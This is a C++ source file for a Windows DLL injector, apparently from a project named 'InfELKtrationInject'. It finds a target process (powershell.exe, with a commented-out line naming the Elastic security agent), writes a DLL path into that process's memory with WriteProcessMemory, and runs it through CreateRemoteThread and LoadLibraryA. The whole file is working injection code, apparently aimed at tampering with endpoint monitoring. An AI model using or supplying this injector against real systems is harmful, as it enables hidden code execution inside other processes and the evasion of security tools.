#include <iostream>
#include <windows.h>
#include <InfELKtrationInjectLib.h>
#include <memoryapi.h>
#include <processthreadsapi.h>
#include <TlHelp32.h>
#include <tchar.h>

#define DLL_FILEPATH_MAX_LENGTH 120

// code references:
// https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes
// https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes

BOOL inject_dll();
void print_error(const char*);

int main()
{
    std::cout << "Hello World!\n";

    inject_dll();
}

BOOL inject_dll() {
    HANDLE hSnapshot, hProcess;
    PROCESSENTRY32 processEntry;
    //TCHAR targetProcess[MAX_PATH] = TEXT("elastic-agent.exe");
    TCHAR targetProcess[MAX_PATH] = TEXT("powershell.exe");
    TCHAR targetDll[MAX_PATH] = TEXT("KERNEL32.DLL");
    CHAR dllFilename[DLL_FILEPATH_MAX_LENGTH] = "C:\\Users\\Administrator\\source\\repos\\InfELKtrationInject\\x64\\Debug\\InfELKtrationInjectLib.dll";
    DWORD targetPid = 0;
    LPVOID szDllFilepath;
    DWORD_PTR target_kernel32_base;
    HMODULE hKernel32_self;
    DWORD loadLibraryOffset;
    LPTHREAD_START_ROUTINE loadLibrary;

    // get snapshot of running processes on the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        print_error("CreateToolhelp32Snapshot");
        return false;
    }

    // PROCESSENTRY32 docs state that the size needs to be initialized b/f calling Process32First
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // get the first process
    if (!Process32First(hSnapshot, &processEntry)) {
        print_error("Process32First");
        return false;
    }

    // loop through processes
    do {
        if (CompareStringOrdinal(targetProcess, -1, processEntry.szExeFile, -1, false) == CSTR_EQUAL) {
            wprintf(L"found target process %s (pid=%d)\n", targetProcess, processEntry.th32ProcessID);
            targetPid = processEntry.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &processEntry));

    CloseHandle(hSnapshot);

    if (!targetPid) {
        _tprintf(TEXT("failed to find target process %s\n"), targetProcess);
        return false;
    }

    // open handle to target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
    if (!hProcess) {
        print_error("hProcess");
        return false;
    }

    printf("opened handle to target process: 0x%p\n", hProcess);

    // allocate memory for the dll filepath
    szDllFilepath = VirtualAllocEx(hProcess, NULL, DLL_FILEPATH_MAX_LENGTH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!szDllFilepath) {
        print_error("VirtualAllocEx");
        return false;
    }

    printf("allocated mem for dll filepath: 0x%p\n", szDllFilepath);

    // write dll path into target process
    if (!WriteProcessMemory(hProcess, szDllFilepath, dllFilename, DLL_FILEPATH_MAX_LENGTH, NULL)) {
        print_error("WriteProcessMemory");
        return false;
    }

    puts("copied dll path into target process");

    loadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"Kernel32"), "LoadLibraryA");
    CreateRemoteThread(hProcess, NULL, NULL, loadLibrary, szDllFilepath, NULL, NULL);

    puts("executed DLL in target process");

    //VirtualFreeEx(hProcess, (LPVOID)szDllFilepath, 0, MEM_RELEASE); // this will crash the process, i haven't a clue why
    CloseHandle(hProcess);

    return true;
}

void print_error(const char* msg) {
    DWORD eNum;
    char error[256];

    eNum = GetLastError();
    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, eNum, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error, 256, NULL);

    error[strcspn(error, ".\r\n")] = 0;

    printf("ERROR: %s failed (%d): %s\n", msg, eNum, error);
}